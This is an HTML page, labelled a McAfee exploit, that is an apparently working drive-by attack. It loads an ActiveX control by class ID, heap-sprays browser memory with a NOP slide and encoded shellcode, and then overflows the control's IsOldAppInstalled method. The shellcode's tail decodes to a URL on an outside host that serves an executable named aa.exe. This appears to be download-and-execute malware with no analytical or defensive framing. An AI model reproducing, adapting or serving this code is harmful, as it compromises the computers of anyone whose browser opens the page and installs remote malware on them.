<!-- McAfee exploit:) Jambalaya-->

<html>
<object classid="clsid:9BE8D7B2-329C-442A-A4AC-ABA9D7572602" id='target'></object>
<body>
<SCRIPT language="javascript">
	var heapSprayToAddress = 0x05050505;
	var shellcode = unescape("%u9090"+"%u9090"+ 
"%u10eb%u4b5b%uc933%ub966%u013c%u3480%u990b%ufae2" +
"%u05eb%uebe8%uffff%u70ff%u9934%u9999%u12c3%uaa6b" +
"%u3559%u01a4%u9999%uec99%u186f%u5175%u9999%u1299" +
"%u106d%ubdcf%u0c71%u9999%uaa99%u1042%u669f%uf1af" +
"%ud717%u7597%u3471%u9999%u1099%u91df%uf5f1%u99f5" +
"%uf199%uf7f6%ufdb7%uecf1%uf5eb%ucdf4%ucf66%u1091" +
"%u9ddf%uaf66%ue7f1%u7b41%u71ea%u9911%u9999%udf10" +
"%u6695%uf1af%u6701%u9713%ue071%u9999%u1099%u8ddf" +
"%uaf66%ubcf1%u6629%u715b%u99f3%u9999%udf10%u6681" +
"%u9def%uaff1%ub683%u71e9%u99c3%u9999%udf10%uf389" +
"%uf1fc%ub7ea%ue1fc%uff10%u6685%u85ef%ucf66%uaa81" +
"%uc850%u66c8%u85ef%uef66%uc8bd%ucf66%uaa89%uc850" +
"%uef66%u6685%u8dcf%ucf66%u7095%u9919%u9999%ucfcc" +
"%u38fd%u99a9%u9999%u591c%u95e1%ud912%u1295%u85e9" +
"%u1234%u91f1%u9072%ud912%u12ad%u2131%u9999%u1299" +
"%uc75c%u5bc4%u999d%uccca%ucecf%uf512%u81bd%udc12" +
"%u12a5%u9ccd%u9ae1%u124c%u81d3%uc312%u9ab9%u7a44" +
"%ud0ab%uad12%u9a12%uaa6c%u6566%u59aa%ua335%ued5d" +
"%u589e%u9456%u619a%u6b72%ue5a2%u8dbd%u78ec%uc312" +
"%u9abd%uff44%u9512%u12d2%u85c3%u449a%u9d12%u9a12" +
"%u725c%uaa9b%u1259%uc64c%uc4c7%u5bc2%u999d%u5071" +
"%u6667%u6866%u7474%u3a70%u2f2f%u7375%u7265%u662e" +
"%u6572%u3265%u372e%u3137%u3936%u6e2e%u7465%u322f" +
"%u3738%u3035%u3336%u3635%u612f%u2e61%u7865%u9865");

var heapBlockSize = 0x400000;
var payLoadSize = shellcode.length * 2;
var spraySlideSize = heapBlockSize - (payLoadSize+0x38);
var spraySlide = unescape("%u0505%u0505");
spraySlide = getSpraySlide(spraySlide,spraySlideSize);
heapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize;
memory = new Array();

for (i=0;i<heapBlocks;i++)
{
		memory[i] = spraySlide + shellcode;
}
var padding = String.fromCharCode(0x06);
while( padding.length< 500)
{
padding +=padding;
}
var str = padding.substring(0,500);
var arg2="defaultV";
target.IsOldAppInstalled(str, arg2);
function getSpraySlide(spraySlide, spraySlideSize)
{
	while (spraySlide.length*2<spraySlideSize)
	{
		spraySlide += spraySlide;
	}
	spraySlide = spraySlide.substring(0,spraySlideSize/2);
	return spraySlide;
}

</script>
</body>
</html>
